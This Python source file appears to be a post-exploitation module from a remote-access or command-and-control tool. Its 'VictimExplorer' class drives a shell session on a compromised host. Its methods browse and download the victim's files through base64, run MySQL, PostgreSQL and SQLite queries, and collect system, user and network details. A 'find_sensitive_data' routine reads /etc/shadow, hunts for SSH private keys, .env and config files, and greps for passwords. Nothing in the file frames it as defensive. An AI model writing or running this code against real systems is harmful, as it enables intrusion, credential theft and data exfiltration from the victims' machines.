import os, json, base64, re
from datetime import datetime

from db import get_connection

EXPLORER_WORKSPACE = os.path.join(os.path.dirname(__file__), "explorer_downloads")
os.makedirs(EXPLORER_WORKSPACE, exist_ok=True)

class VictimExplorer:
    def __init__(self, session_interact_fn):
        self.session = session_interact_fn
        self.current_path = "/"
        self.downloads = {}

    def run(self, command: str) -> str:
        try:
            return self.session(command)
        except Exception as e:
            return f"[!] Error: {e}"

    def list_directory(self, path: str = "/") -> dict:
        self.current_path = path
        escaped_path = path.replace("'", "'\\''")
        output = self.run(f"ls -la '{escaped_path}' 2>&1")
        if "[!]" in output and "Error" in output:
            output = self.run(f"dir '{escaped_path}' 2>&1")
        return self._parse_ls_output(output, path)

    def _parse_ls_output(self, output: str, path: str) -> dict:
        items = []
        total_size = 0
        lines = output.strip().split("\n")
        for line in lines:
            line = line.strip()
            if not line or line.startswith("total ") or line.startswith("Volume"):
                continue
            parts = line.split(None, 8)
            if len(parts) < 9:
                continue
            perms = parts[0]
            if perms.startswith("d"):
                item_type = "dir"
            elif perms.startswith("l"):
                item_type = "link"
            elif perms.startswith("-"):
                item_type = "file"
            else:
                item_type = "other"
            size = parts[4] if len(parts) > 4 else "0"
            try:
                total_size += int(size)
            except ValueError:
                pass
            name = parts[8] if len(parts) > 8 else parts[-1]
            m_time = f"{parts[5]} {parts[6]} {parts[7]}" if len(parts) > 7 else ""
            items.append({
                "name": name,
                "type": item_type,
                "size": size,
                "permissions": perms,
                "modified": m_time,
                "owner": parts[2] if len(parts) > 2 else "",
                "group": parts[3] if len(parts) > 3 else "",
            })
        return {"path": path, "items": items, "total_items": len(items), "total_size": total_size}

    def read_file(self, path: str, max_bytes: int = 100000) -> dict:
        escaped = path.replace("'", "'\\''")
        file_type = self._guess_file_type(path)
        if file_type == "text":
            output = self.run(f"cat '{escaped}' 2>&1")
            if len(output) > max_bytes:
                output = output[:max_bytes] + "\n... [truncado]"
            return {"path": path, "type": "text", "content": output, "size": len(output)}
        output = self.run(f"base64 '{escaped}' 2>&1")
        if "[!]" in output:
            return {"path": path, "type": "error", "content": output}
        return {"path": path, "type": "binary", "content": output.strip(), "size": len(output)}

    def _guess_file_type(self, path: str) -> str:
        text_exts = {".txt", ".md", ".py", ".js", ".html", ".css", ".xml", ".json", ".yml", ".yaml",
                     ".conf", ".cfg", ".ini", ".log", ".sh", ".bash", ".php", ".rb", ".pl", ".sql",
                     ".csv", ".env", ".htaccess", ".dockerfile", ".gitignore", ".toml", ".lock"}
        ext = os.path.splitext(path)[1].lower()
        return "text" if ext in text_exts else "binary"

    def download_file(self, path: str, session_id: int = None) -> dict:
        result = self.read_file(path)
        if result["type"] == "error":
            return result
        safe_name = re.sub(r'[^\w\-\.]', '_', os.path.basename(path))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if result["type"] == "binary":
            try:
                content = base64.b64decode(result["content"])
                dest = os.path.join(EXPLORER_WORKSPACE, f"{ts}_{safe_name}")
                with open(dest, "wb") as f:
                    f.write(content)
                result["downloaded_to"] = dest
                result["decoded_size"] = len(content)
            except Exception as e:
                result["decode_error"] = str(e)
        else:
            dest = os.path.join(EXPLORER_WORKSPACE, f"{ts}_{safe_name}")
            with open(dest, "w", encoding="utf-8") as f:
                f.write(result["content"])
            result["downloaded_to"] = dest
        self.downloads[path] = result
        return result

    def search_files(self, pattern: str, base_path: str = "/") -> list:
        escaped_base = base_path.replace("'", "'\\''")
        output = self.run(f"find '{escaped_base}' -type f -name '*{pattern}*' 2>/dev/null | head -100")
        if not output or "[!]" in output:
            output = self.run(f"grep -rl '{pattern}' '{escaped_base}' 2>/dev/null | head -100")
        files = [f.strip() for f in output.split("\n") if f.strip() and not f.startswith("[!]")]
        return files[:100]

    def grep_text(self, pattern: str, base_path: str = "/") -> list:
        escaped = base_path.replace("'", "'\\''")
        output = self.run(f"grep -rn '{pattern}' '{escaped}' 2>/dev/null | head -100")
        results = [l.strip() for l in output.split("\n") if l.strip() and not l.startswith("[!]")]
        return results[:100]

    def find_databases(self) -> list:
        dbs = []
        cmds = [
            "find / -type f \\( -name '*.db' -o -name '*.sqlite' -o -name '*.sql' -o -name '*.mdb' \\) 2>/dev/null | head -50",
            "ls -la /var/lib/mysql/ 2>/dev/null",
            "ls -la /var/lib/postgresql/ 2>/dev/null",
            "ls -la /var/lib/mongodb/ 2>/dev/null",
            "ls -la /opt/ 2>/dev/null",
        ]
        for cmd in cmds:
            output = self.run(cmd)
            if output and not output.startswith("[!"):
                dbs.append({"command": cmd, "output": output[:2000]})
        return dbs

    def query_mysql(self, query: str, user: str = "root", password: str = "", host: str = "localhost") -> str:
        return self.run(f'mysql -h {host} -u {user} -p{password} -e "{query}" 2>&1')

    def query_postgres(self, query: str, user: str = "postgres", db: str = "postgres", host: str = "localhost") -> str:
        return self.run(f'psql -h {host} -U {user} -d {db} -c "{query}" 2>&1')

    def query_sqlite(self, db_path: str, query: str) -> str:
        return self.run(f'sqlite3 "{db_path}" "{query}" 2>&1')

    def get_system_info(self) -> dict:
        return {
            "hostname": self.run("cat /etc/hostname 2>/dev/null || hostname 2>/dev/null"),
            "os": self.run("cat /etc/*release 2>/dev/null | head -5"),
            "kernel": self.run("uname -a"),
            "users": self.run("cat /etc/passwd 2>/dev/null | grep -E '/bin/bash|/bin/sh'"),
            "sudoers": self.run("cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$' | head -30"),
            "crons": self.run("ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null"),
            "network": self.run("ip addr 2>/dev/null || ifconfig 2>/dev/null"),
            "connections": self.run("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"),
            "processes": self.run("ps aux 2>/dev/null | head -50"),
            "suid": self.run("find / -perm -4000 -type f 2>/dev/null | head -30"),
            "env_vars": self.run("env 2>/dev/null | head -30"),
        }

    def find_sensitive_data(self) -> list:
        patterns = [
            ("password", "grep -rl 'password' /etc /opt /home /var/www 2>/dev/null | head -20"),
            ("config", "find / -name '*.conf' -o -name 'config.php' -o -name '.env' 2>/dev/null | head -30"),
            ("ssh keys", "find / -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -20"),
            ("backup", "find / -name '*.bak' -o -name '*.backup' -o -name 'backup*' 2>/dev/null | head -20"),
            ("database dumps", "find / -name '*.sql' -size +1k 2>/dev/null | head -20"),
            ("shadow", "cat /etc/shadow 2>/dev/null | head -20"),
        ]
        results = []
        for label, cmd in patterns:
            output = self.run(cmd)
            if output and not output.startswith("[!]") and output.strip():
                results.append({"label": label, "command": cmd, "output": output[:2000]})
        return results

def format_explorer_response(data: dict) -> dict:
    return {
        "success": "error" not in data,
        "data": data,
        "timestamp": datetime.now().isoformat(),
    }
